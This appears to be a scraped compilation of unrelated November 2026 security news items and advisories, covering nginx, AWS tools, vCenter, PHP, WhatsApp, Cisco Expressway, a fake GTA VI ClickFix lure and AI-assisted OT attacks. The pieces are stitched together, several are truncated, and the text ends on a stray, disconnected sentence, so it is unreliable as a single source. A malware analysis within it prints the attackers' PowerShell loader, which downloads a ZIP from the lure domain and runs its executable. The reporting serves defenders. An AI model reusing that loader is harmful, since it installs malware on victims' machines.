What elevates the severity of NGINX2Root is the chain it enables. The nginx worker process runs as an unprivileged system account, typically www-data or nginx. While that account alone does not have root access, a second flaw in the Linux kernel’s SCTP networking subsystem can be reached from the compromised worker and exploited to escalate privileges to root. Researchers demonstrated the full chain end-to-end, including escaping a Docker container running nginx to reach the underlying host.
The attack chain in brief:
Attacker sends crafted HTTP/2 frames to a public-facing nginx instance with no credentials requiredMemory corruption in the nginx worker yields code execution as the webserver accountA Linux kernel SCTP flaw elevates privileges from the worker account to rootThe attacker escapes the Docker container to reach the host system
Additional CVEs round out the NGINX2Root set, each requiring different but common configurations: specific reverse proxy and resolver settings (CVE-2026-123634), HTTP/2 with upstream forwarding (CVE-2026-123633), HTTP/3 with upstream forwarding (CVE-2026-121810), and mail proxy mode (CVE-2026-113425).
A public proof-of-concept is available for CVE-2026-123007. Triggering the memory corruption requires transmitting approximately 128GB of HTTP/2 data (roughly two minutes over a 10 Gbit/s connection). This limits opportunistic mass internet exploitation today, but it does not prevent targeted attacks, exploitation from within a network, or future techniques that reduce the data requirement. Organizations should not treat this constraint as a reason to delay patching.

Nginx is estimated to serve more than a third of the world's websites.1 The five CVEs affect different version ranges and configuration conditions. HTTP/2 must be enabled for CVE-2026-123007 and CVE-2026-123633, which are the most severe. The table below summarizes affected versions and conditions per the official nginx advisory.

CVE-2026-133199 - Incorrect privilege assignment on reused e-mail addresses or group names in AWS ssosync

Bulletin ID: 2026-194-AWS
Scope: AWS
Content Type: Important (requires attention)
Publication Date: 11/20/2026 08:30 AM PST

Description:

ssosync is an open-source tool that synchronizes users and groups from Google Workspace into AWS IAM Identity Center..

We identified CVE-2026-133199, an issue in the user and group reconciliation logic in ssosync. When a Google Workspace account or group did not match an existing IAM Identity Center user or group by its immutable identifier, ssosync matched it by e-mail address or group name instead and updated the existing user or group in place. As a result, a Google Workspace account or group that was assigned a reused e-mail address or group name could inherit the IAM Identity Center group memberships and permission set assignments of a previously synchronized, unrelated identity.

Impacted versions: < 2.9.5

Resolution:

This issue has been addressed in ssosync version 2.9.5. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. Users should also confirm that their IAM Identity Center group memberships and permission set assignments are as expected.

Workarounds:

There is no workaround available.

References:

CVE-2026-133199
GHSA-8mf9-xp78-xr32

Acknowledgement:

We would like to thank George Chen for collaborating on this issue through the coordinated vulnerability disclosure process.

Please email aws-security@amazon.com with any s ecurity questions or concerns.

CVE-2026-130901 - Improper limitation of a pathname to a restricted directory in Amazon awslabs.document-loader-mcp-server

Bulletin ID: 2026-195-AWS
Scope: AWS
Content Type: Important (requires attention)
Publication Date: 11/20/2026 10:30 AM PST

Description:

Document Loader MCP Server is an open-source Model Context Protocol (MCP) server that lets AI assistants parse and extract content from PDF, Office and image files on the local filesystem.

We identified CVE-2026-130901, an issue in Document Loader MCP Server versions 1.0.10 through 1.0.20. When DOCUMENT_BASE_DIR is not set or is empty and the server runs with continuous integration or test environment variables present, the default base directory restriction is not enforced. This might allow an actor who can influence the documents an MCP client processes to read supported files outside the intended directory. In versions 1.0.12 through 1.0.20, it might also allow them to write PNG slide images to other directories.

Impacted versions: >= 1.0.10 AND < 1.0.21

Resolution:

This issue has been addressed in awslabs.document-loader-mcp-server version 1.0.21. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.

Workarounds:

If you cannot upgrade immediately, set DOCUMENT_BASE_DIR to the directory that holds your documents. Do not set it to /, which removes the restriction.

References:

CVE-2026-130901

Acknowledgement:

We would like to thank Rishaank Gupta for collaborating on this issue through the coordinated disclosure process.

Please email aws-security@amazon.com with any s ecurity questions or concerns.

title: Fake GTA VI PC client spreads malware through a ClickFix attack
text:
Anti-Malware Research

7 min read

Fake GTA VI PC client spreads malware through a ClickFix attack
Janos Gergo SZELES
Silviu STAHIE

November 20, 2026
Promo Protect all your devices, without slowing them down. Free 30-day trial Bitdefender researchers identified a website claiming to let people play GTA VI on a Windows PC that tells visitors to press Win+R, paste a PowerShell command and run it. Our analysis found that the command leads to malware.Grand Theft Auto VI is Rockstar Games’ open-world game, released for PlayStation 5 and Xbox Series X|S. At the time of writing, no official PC version is available.This is a ClickFix attack like countless others before it; it just tries to use the game’s immense popularity to trick people into thinking it’s real content.The website doesn't claim that you can download a playable version of the new title from Rockstar because that would be too suspicious. Since the game isn’t available on PC, so the attackers present the download as a client for streaming GTA VI from an Xbox or PlayStation console.The website actually says that the game itself doesn’t download to the PC and claims no affiliation with Rockstar Games or Take-Two Interactive in an effort to alleviate users’ suspicions.While this is a new attack, Total Security's Advanced Threat Defense detected the threat nonetheless, and Bitdefender users remained safe.  The following is an analysis of what would have happened if the PC wasn’t protected by Total Security.Key TakeawaysA fake GTA VI streaming client uses a ClickFix command to trick Windows users into installing malwareThe malware can steal browser logins, cookies, gaming and crypto wallet data, plus AI and developer credentialsIt hides its payload by abusing legitimate Windows tools and injecting code into other processesBitdefender Total Security’s Advanced Threat Defense detected the threat and protected users from it The site offers two ways to install its Windows client. The standard option asks users to download a ZIP file, unpack it and open GTA6Cloud.exe. The alternative tells them to press Win+R, paste a command and press Enter.The command starts PowerShell with ExecutionPolicy Bypass. It then uses irm to retrieve a script from the site and pipes it into iex, which executes the script. The page says the script downloads and unpacks the ZIP into AppData, then starts the client.This is what happens in the background:$ErrorActionPreference = “Stop”
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = “hxxps://gta6cloud[.]nexus/downloads/GTA6Cloud[.]zip” #redacted to defang URL
$dir = Join-Path $env:LOCALAPPDATA “GTA6Cloud”
$zip = Join-Path $env:TEMP “GTA6Cloud.zip”
$exe = Join-Path $dir “GTA6Cloud.exe”
Write-Host “GTA6Cloud: downloading launcher ZIP…”
New-Item -ItemType Directory -Force -Path $dir | Out-Null
Invoke-WebRequest -Uri $url -OutFile $zip -UseBasicParsing
if (-not (Test-Path $zip) -or (Get-Item $zip).Length -lt 1000000) {
throw “Download failed or file too small.”
}
Write-Host “GTA6Cloud: unpacking…”
Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force
if (-not (Test-Path $exe)) {
throw “GTA6Cloud.exe missing after unpack.”
}
Write-Host “GTA6Cloud: starting…”
Start-Process -FilePath $exe
This is a ClickFix attack: instead of relying on a software vulnerability, the instructions convince victims to run a command themselves. A familiar Windows dialog and step-by-step directions make the action look like an ordinary installation process. In practice, the command retrieves code from the internet and runs it on the PC.The use of ExecutionPolicy Bypass and the iex command means the script runs without the user first inspecting its contents.The main executable is GTA6Cloud.exeThe archive contains only one executable named GTA6Cloud.exe. This executable is actually a Tauri bundler; once executed, it unpacks its contents, which include a decoy web page that shows the user a GTA6-related HTML page and plays the game’s […]

title: SentinelOne Singularity Operations Center - Cloud Funnel and the Filters That Decide What Leaves
text: This feature was available in the previous console as well, but I do not think I ever covered it, so I am covering it here.Cloud Funnel sits under Singularity Data Lake. It takes your EDR and XDR telemetry and writes a copy of it into storage that you own. Compressed JSON, structured and enriched the same way Deep Visibility data is, so if you can read DV you can read this.The reason you would want it: retention in the platform is whatever you pay for, retention in your own bucket is whatever you decide. Add to that joining SentinelOne events against your other logs in your own SIEM, and that is the whole case for the feature.So here you can decide whether you want to send all of your data, or only a little of it. That decision is the real content of this article, and most of it comes down to two filters I will get to further down. First, go and check whether it is already onDo you actually know whether Cloud Funnel is switched on in your tenant?I did not. I went and looked properly for the first time last week and it was enabled on multiple sites.And all sites were streaming everything. No query filter. No field selection. Every field of every event, leaving the platform continuously, into buckets nobody had looked at.Nothing was broken. Nobody had made a mistake. It was working exactly as configured. The problem was that nobody had revisited the configuration since the day it was set up, and the default configuration is "send all of it".So before you read the rest of this, go and open Singularity Data Lake → Cloud Funnel and find out which scopes have a configuration. It takes two minutes. Where it can sendFive destinations:Amazon S3 — from Union SquareGoogle Cloud Storage — from version WMicrosoft Azure Blob Storage container — from version Y SP4Cloudflare R2 bucketGoogle SecOpsEach wants something slightly different in the box. Azure takes a Blob SAS URL, not a bucket name, so you need the Blob URL and the SAS token together in one string. R2 wants the S3 API string you generate from the R2 bucket's own settings, not the friendly name. Google SecOps wants a region, for example us, and a log type, where SENTINELONE_CF is the standard one.Licensing is Singularity Complete plus the Cloud Funnel add-on, and it does not work in self-hosted environments at all. Do the volume arithmetic before you enable anythingSentinelOne publish typical per-agent-per-day averages. Read the bottom half of this table slowly:Agent typeEvents per day, per agentWindows 22.3 and above90,000Windows 22.2 and below140,000macOS140,000 (around 280MB uncompressed)Linux agents500,000Linux servers4,000,000Kubernetes agents2,000,000One Linux server produces more events per day than forty-four Windows endpoints. So the number you work out from a workstation estate stops being the number the moment somebody adds a Kubernetes cluster.Multiply your own fleet out, multiply by your retention period, then look at your storage pricing. Do it now rather than when the invoice arrives.There is a built-in estimator on the configuration page, and from S-24.1.0 it shows you a projected volume when your selected scope is a Site. One warning from my own testing: when I drove the estimator through the API it returned the same account-wide total no matter which site I asked about. The console page may well behave properly, but check the number against something you trust before you plan a per-site rollout on it. Scope and inheritance, which has a trap in itThree levels: Global, then Account, then Site. Site-level configuration arrived at S-24.2.1.Inheritance flows downward. Accounts inherit Global, Sites inherit their Account, and a child configuration overrides its parent for that child only. You break inheritance to give one scope its own settings, and the page tells you which state you are in.Now the trap. If you enable Cloud Funnel on an Account but no Site underneath it is enabled, no data flows. The configuration is valid, the bucket validates, everything looks right, […]

title: Mapping the AI threat landscape: MITRE ATLAS comes to Elastic Security
text: BlogMapping the AI threat landscape: MITRE ATLAS comes to Elastic SecurityElastic Security 9.6 adds MITRE ATLAS to our detection rules and the tools you use to manage them, so you can see which AI attacks your rules already cover.November 20, 2026Davis PlumleeAI & AutomationSecurity OperationsSOCJump to Share Elastic Security 9.6 supports MITRE Adversarial Threat Landscape for Artificial-Intelligence Systems (ATLAS), MITRE’s knowledge base for attacks on AI systems, in addition to MITRE ATT&CK. ATLAS covers prompt injection, jailbreaks, stolen model API keys, and poisoned agent tools. In Elastic Security 9.6, prebuilt detection rules for AI platforms and generative AI (GenAI) tooling will ship with ATLAS mappings already applied, so rules provide the AI-related context out of the box. MITRE recently announced that ATT&CK Enterprise will add AI-enabled systems as a new platform, drawing in part on ATLAS content. However, ATLAS remains MITRE’s dedicated, frequently updated AI threat knowledge base. A new coverage table shows which ATLAS tactics and techniques your rules already address, scored in its own view rather than averaged into your ATT&CK numbers. The rule creation form and Elastic Agent Builder also understand ATLAS. Behind it all is a new managed MITRE data service in Kibana.We’ve supported MITRE ATT&CK since the initial version of Elastic Security, and we’ve extended that support over the years with ATT&CK mappings on prebuilt rules and features, like the coverage overview page. What is MITRE ATLAS?MITRE ATLAS is a knowledge base of the tactics and techniques that adversaries use against AI-enabled systems. It's maintained by MITRE and shaped by real-world observations and security research from across the industry and academia. ATLAS is modeled directly on ATT&CK, so the structure will feel familiar to users: tactics to describe what an adversary is trying to achieve, plus techniques and sub-techniques to describe how they go about it.MITRE ATLAS versus MITRE ATT&CKATLAS and ATT&CK use the same structure, but they describe attacks against different kinds of systems.MITRE ATLASMITRE ATT&CKWhat it coversModels, training data, and agentsHosts, networks, identities, and cloud infrastructureStructureSame structure, reusing ATT&CK tactics and adding AI-specific ones, like AI Attack Adaptation and AI Model AccessTactics, techniques, and sub-techniquesUpdate cadenceMonthly content releasesRoughly twice a yearIn Elastic SecurityPrebuilt rule mappings, coverage overview tab, rule form, and Agent BuilderPrebuilt rule mappings, coverage overview tab, rule form, and Agent BuilderThe goal of ATLAS is to give defenders the same thing that ATT&CK did a decade ago: a common, evidence-based vocabulary for a class of threats that they can use to assess their own vulnerabilities. And ATLAS complements ATT&CK, rather than replacing it. Attacks on AI systems rarely happen in isolation. An adversary might use familiar intrusion techniques to get access and then, once inside, turn to AI-specific techniques. Mapping detections to both frameworks, like some of the detection rules we’re shipping, gives users a more complete picture of an attack, including the infrastructure it propagates and the AI systems it targets.For Elastic Security users, this means a clear view of how well your detections cover the AI systems in your environment, measured on its own terms instead of mixed into your ATT&CK numbers. As your organization adopts large language models (LLMs) and AI services, in addition to autonomous agents, you can see which AI-specific threats your rules already address and find gaps before an attacker does. Our prebuilt detection rules for AI platforms and GenAI tooling now carry ATLAS mappings alongside ATT&CK, so this coverage view is populated from day one.How MITRE ATLAS works in Elastic SecurityIn Kibana’s 9.6 release, we will implement support for ATLAS in the ways that customers have come to expect from the MITRE ATT&CK data. title: VMware vCenter authentication bypass zero-day fixed
text:
November 20, 2026

|

Security intelligence

VMware vCenter authentication bypass zero-day fixed

By Field Effect Security Intelligence Team

At a glance:

On November 20, 2026, Google threat intelligence team disclosed that a suspected China-nexus threat actor tracked as ARMORY CASTLE exploited CVE-2026-123890 as a zero-day beginning in early September 2026.

CVE-2026-123890 is an authentication bypass vulnerability in VMware Directory Service within VMware vCenter Server. Successful exploitation can provide administrator-level access to vCenter without valid credentials.

Broadcom released fixes on November 18, 2026 with no workarounds available. Organizations using vCenter Server, VMware Cloud Foundation, vSphere Foundation, Telco Cloud Platform, or Telco Cloud Infrastructure need to verify deployed versions and determine whether remediation is required.

Threat summary
On November 19, 2026, Google Threat Intelligence Group (GTIG) and Mandiant disclosed that a suspected China-nexus threat actor tracked as ARMORY CASTLE (formerly UNC5221) had been exploiting CVE-2026-123890 as a zero day since at least early September 2026.
CVE-2026-123890 affects VMware vCenter Server, the central management platform for VMware virtual infrastructure. The vulnerability resides in VMware Directory Service (vmdird), which supports vCenter's SSO infrastructure and stores user identities, authentication data, and the key used to sign SAML authentication tokens. A threat actor with network access to vCenter can exploit the vulnerability to bypass authentication and obtain administrative access without valid credentials or user interaction.
Affected versions include:

vCenter 9.1.x before 9.1.1.0200
vCenter 9.0.x before 9.0.2.0200, and
vCenter 8.0 before Update 3m

The vulnerability is also present in vCenter deployments bundled with VMware Cloud Foundation (VCF) 5.x and 9.x, vSphere Foundation, Telco Cloud Platform, and Telco Cloud Infrastructure. Unsupported vCenter 7.0, 6.7, and 6.5 deployments are presumed affected. The issue is present in both standalone deployments and environments using Enhanced Linked Mode (ELM).
The intrusion documented by GTIG shows how CVE-2026-123890 was used to move from an existing foothold inside a network to administrative control of the virtualization environment. Initial access was obtained through CVE-2026-102764, a separate zero-day vulnerability in BeyondTrust Remote Support.
After compromising the internet-facing appliance, the threat actor scanned the internal network for vCenter services, including ports 443, 2012, and 5480. The threat actor then moved to internal Linux appliances that were not running endpoint detection and response (EDR) tools and deployed web shells for command execution and file staging.
From those systems, the threat actor used BONESAW, a custom exploitation tool developed for CVE-2026-123890, against the vCenter service on TCP port 2012. The exploit returned an authenticated administrator session without requiring valid credentials. The adversary then created a new single sign-on (SSO) administrator account and copied the VMware Directory Service (vmdird) database containing the Security Assertion Markup Language (SAML) signing key.
A second tool, SAWSNAKE, used the stolen key to forge SAML authentication tokens, allowing the threat actor to impersonate users and bypass multi-factor authentication (MFA).
The threat actor subsequently accessed an ESX host and copied the Active Directory (AD) database and registry hives directly from a Windows virtual machine disk without logging into the guest operating system. The stolen files were then staged on the compromised BeyondTrust appliance for likely exfiltration.
Analysis
The environments most relevant to this threat are those where vCenter is reachable from networks beyond a dedicated administration segment. Internet exposure is not required. In the activity observed by GTIG, the threat actor reached vCenter from an existing foothold […]

title: Another Shell?! phpAfterShell headlines PHP security release
text:
November 20, 2026

|

Security intelligence

Another Shell?! phpAfterShell headlines PHP security release

By Field Effect Security Intelligence Team

At a glance:

PHP released versions 8.5.13, 8.4.28, 8.3.37, and 8.2.36 on November 19, 2026, fixing 18 vulnerabilities across supported branches, including seven vulnerabilities rated Critical by the PHP project.

Researchers published technical details for phpAfterShell, tracked as CVE-2026-126714, showing how corruption of PHP's default session files can lead to object injection and, when combined with a suitable gadget chain or additional vulnerability, potentially code execution.

The most relevant environments to review are internet-facing PHP applications using PHP-FPM with FastCGI connection reuse enabled and applications relying on PHP's default file-based session storage. No public reporting indicates active exploitation of the newly disclosed vulnerabilities.

Threat summary
On November 19, 2026, PHP released 8.5.13, 8.4.28, 8.3.37 and 8.2.36, fixing 18 vulnerabilities, seven of them rated critical. The same day, researchers published technical details on one of the flaws, CVE-2026-126714, dubbed phpAfterShell. The technical details demonstrate how a flaw in PHP's default session handling can be used to manipulate user sessions and, when combined with another vulnerability, achieve code execution on the server.
PHP applications use sessions to track authentication state, permissions, shopping carts, and other user data between requests. phpAfterShell affects PHP’s default file-based session storage and is closely related to the PHP2Shell vulnerabilities disclosed in October 2026.
While PHP's October updates limited which objects could be created while PHP recorded upload progress, researchers found that interrupting a session write at a precise moment could corrupt the session file and cause PHP to load attacker-controlled objects later when the application reopened the session. Therefore, servers updated in October remain affected until the November releases are installed.
Researchers demonstrated object injection through a corrupted session file and showed that the same technique can be used to manipulate session data, including values related to authentication and permissions. They also demonstrated a path to code execution by chaining phpAfterShell with a second, undisclosed PHP vulnerability, without relying on a gadget chain in the application. 
The advisory states that code execution is also possible where an application contains a suitable deserialization gadget chain. Successful exploitation requires influence over session data and an interruption at a useful point in the write.
The vulnerability affects:

PHP 8.2 before 8.2.36

PHP 8.3 before 8.3.37

PHP 8.4 before 8.4.28

PHP 8.5 before 8.5.13

Older unpatched builds of end-of-life PHP 7.4, 8.0 and 8.1 are also affected (though the official end-of-life mitigation branches for those versions are not)

Deployments that store sessions in Redis, databases, or other external backends are outside this specific flaw, though each store’s handling of interrupted updates warrants its own review.
The release also addresses CVE-2026-129289, a vulnerability in PHP-FPM, the component that executes PHP code behind web servers such as nginx and Apache. Under specific deployment conditions, a remote, unauthenticated threat actor can inject a forged FastCGI request that is processed directly by PHP-FPM. The advisory states that successful exploitation can result in execution of attacker-controlled PHP code within the PHP-FPM worker process, without user interaction or a non-default PHP configuration.
Exposure to CVE-2026-129289 is limited to environments that reuse FastCGI backend connections and applications that leave request data unread. Affected front ends include:

nginx with fastcgi_keep_conn on

Apache mod_proxy_fcgi with enablereuse=on

HAProxy FastCGI applications that retain backend connections

LiteSpeed Server […]

title: AI Joins the Industrial Attack Workflow
text:
PUBLISHED ON 20 NOV 2026

Levi Gundert, Chief Security & Intelligence Officer

Summary

The recent cyberattack on French refrigerators and our tracking of the malicious AI framework ARTEX show that threat actors are increasingly using AI to accelerate attacks, expand their reach, and improve their effectiveness. GreenJuliett, the group behind operational technology (OT) cyberattacks similar to those in France, has begun incorporating AI into its OT attack chain. Understanding the scale AI offers financially motivated and state-sponsored threat actors helps us see it as more than a tool: it’s something that can fill an operator’s role, even while humans remain in control.

On October 11 and 12, 2026, someone changed the defrost settings on refrigeration controllers at more than 700 retail locations in France. This resulted in fires, damaged equipment, and food losses estimated in the tens of millions of euros, highlighting the physical impacts of attacks against operational technology (OT). On November 9, France attributed the attack to Shahid Kaveh, a unit of Iran's Islamic Revolutionary Guard Corps Cyber Electronic Command (IRGC-CEC). We track activity that likely belongs to an element of Shahid Kaveh as GreenJuliett.GreenJuliett (also known as CyberAv3ngers and Bauxite) builds infrastructure aimed at internet-facing PLCs. And while that work continued through at least October 30, despite repeated public reporting on the group, the target set began to widen. Between August and October, we observed GreenJuliett-linked infrastructure scanning, or attempting to exploit, Fortinet FortiGate firewalls, edge devices that protect OT networks, in Bahrain, Israel, Jordan, Kuwait, Saudi Arabia, and Qatar. Our network data suggests the group is also working to add internet-of-things (IoT) and CCTV devices to its list.While we have not independently tied GreenJuliett infrastructure to the refrigeration attacks, over the past three months, we have seen the group continue to target PLCs (programmable logic controllers), which are similar to the internet-exposed controllers the refrigerators in France used. We have also observed that AI is now part of how they work.From Accounts to InfrastructureIn October 2024, OpenAI banned accounts it assessed as belonging to CyberAv3ngers. The operators had used ChatGPT to research default credentials for PLCs, compile lists of electricity companies and common PLCs in Jordan, and draft scripts against industrial protocols (such as Modbus TCP, a control protocol that allows PLCs to communicate quickly on local networks).However, in 2026, the picture is different. In October, we found a configuration for LiteLLM (an open-source gateway that puts multiple AI models behind a single interface, suggesting a team-sharing model for access), alongside self-hosted chat applications built for Persian-language users, on infrastructure we assessed as likely used by GreenJuliett-linked operators. We also observed servers in the group's anonymization network communicating with infrastructure that hosts Anthropic's Claude.While we have not confirmed specific instances of misuse in this research, both OpenAI and Anthropic have reported publicly on detecting and disrupting misuse by Iranian government operators. AI shortens the time it takes to identify vulnerable device types and write targeting scripts, and GreenJuliett has moved it from individual accounts into its operating environment.

Figure 1: The GreenJuliett operation path, as observed from August to October 2026

AI As OperatorGreenJuliett uses AI as an assistant. A separate class of tooling makes AI the operator, and it is already deployed at scale.For example, ARTEX AI is one of eight offensive AI frameworks we track. Material recovered from exposed ARTEX servers shows how the agent works: Nmap, Masscan, and Nuclei for reconnaissance; Hydra and sqlmap for access; Chisel for tunneling. While the toolkit is familiar, the agent has now become the operator: On […]

WhatsApp patched three security flaws, including one exploited in a real scam campaign to make fraudulent messages appear more credible.

WhatsApp’s November security advisory fixes three flaws, including CVE-2026-23871, a vulnerability in Click to WhatsApp ads affecting WhatsApp and WhatsApp Business for Android versions earlier than 2.26.17.4.

“Incomplete validation of external ad-reply URLs in WhatsApp for Android and WhatsApp Business for Android before 2.26.17.4 could have caused a target’s device to reveal its IP information to an attacker if an attacker sent media from an attacker-controlled URL when a crafted Click to WhatsApp ad-reply message was rendered and displayed in a message thread.” reads the advisory. “This issue may have been abused in conjunction with specific spam messages.”

The issue was caused by incomplete checks on external ad-reply URLs. An attacker could use a server under their control to send media through a crafted ad-reply message. When the message appeared in a chat, it could cause the victim’s device to reveal its IP address to the attacker.

SecurityWeek reported that WhatsApp discovered the flaw while investigating a real scam campaign. The company’s security team found that a scammer was exploiting the issue to make fraudulent messages appear more credible.

“Our team found this issue while disrupting a scam campaign, and we believe a scammer was using it to make their scam message seem more credible.” a WhatsApp spokesperson told SecurityWeek.

HACKERS EXPLOIT CISCO EXPRESSWAY FLAW CVE-2026-76466 TO BREACH RUSSIAN ORGANIZATION
Pierluigi Paganini

November 20, 2026
Cisco Expressway flaw CVE-2026-76466 is being exploited to gain root access and move from exposed devices into internal networks.

Attackers have exploited a critical flaw, tracked as CVE-2026-76466 (CVSS score of 9.8) in Cisco Expressway to breach a Russian organization, and they moved fast once a working exploit went public.

“A vulnerability in the database service feature of Cisco Expressway Series could allow an unauthenticated, remote attacker with network access to a Cisco Expressway device to execute arbitrary operating system commands as root.” reads the advisory.

An unauthenticated remote attacker can trigger the flaw to run commands as root on an affected device. Cisco shipped a fix on 21 October, so this wasn’t a zero-day by the time it got used.

The vulnerability is caused by persistent cookies and weak client certificate checks when TLS Verify Mode is enabled for clustering. An attacker with access to these cookies could connect to the database service and send specific RPC commands, potentially executing arbitrary commands with root privileges on the affected device.

Russian security firm F6 says this is the first known case of the flaw being exploited in the wild, and it happened on Expressway X15.5.3 devices after a proof-of-concept exploit appeared on GitHub. The attackers started with two internet-facing Expressway boxes.

“The attackers initially compromised two Cisco Expressway internet-facing devices.” reads the advisory by F6. “Through one of them, they gained access to two additional cluster nodes located on the organization’s internal network. After obtaining root access, the attackers began preparing tooling for further lateral movement across the infrastructure.”

Three separate systems experienced major disruptions in less than two weeks, raising questions about what was happening.
